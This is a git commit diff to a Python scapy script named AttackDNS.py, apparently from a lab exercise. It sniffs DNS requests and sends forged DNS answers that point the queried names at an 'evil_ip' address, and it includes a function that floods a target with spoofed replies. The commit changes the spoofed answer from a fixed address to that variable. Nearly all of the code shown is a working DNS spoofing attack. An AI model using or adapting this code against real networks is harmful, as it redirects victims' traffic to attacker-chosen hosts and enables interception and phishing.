43393b8e979784e11c0c991cde71f578eb3301bf
lab2112 <brandon.coates@gmail.com>
2015-03-05 02:34:54 -0500

    fixing commit date

--- AttackDNS.py
+++ AttackDNS.py
@@ -3,6 +3,8 @@ from scapy.all import *
 import argparse
 import thread
 
+evil_ip = "9.9.9.9"
+
 #sniff the traffic for at least a minute to try to capture DNS server
 def sniff_dns(sniff_time):
 	
@@ -18,16 +20,16 @@ def sniff_dns(sniff_time):
 	print "sniffing for DNS requests for " + str(sniff_time) + " seconds"
 	sniff(prn=attack, count=3, timeout=sniff_time, filter=dns_filter)
 	print "Limit Reached"
-#packet breakdown
+
 def attack(packet):
 	
 	print "Caught one sending one..."
 	poison=IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(sport=53, dport=packet[UDP].sport) \
 	/DNS(id=packet[DNS].id, qr=1, rd=1, ra=1, qdcount=1, ancount=1, qd=DNSQR(qname=packet[DNSQR].qname, qtype="A", qclass="IN"), \
-	an=DNSRR(rrname=packet[DNSQR].qname, type="A", rclass="IN",ttl=3599, rdata="1.1.1.1" ))
+	an=DNSRR(rrname=packet[DNSQR].qname, type="A", rclass="IN",ttl=3599, rdata=evil_ip ))
 	
 	send(poison, inter=0, loop=0, verbose=0)
-	return
+	
 #spam client with DNS replies
 def spam_replies(evil_ip, target):
 	print "About to spam " + target + " with IP: " + evil_ip
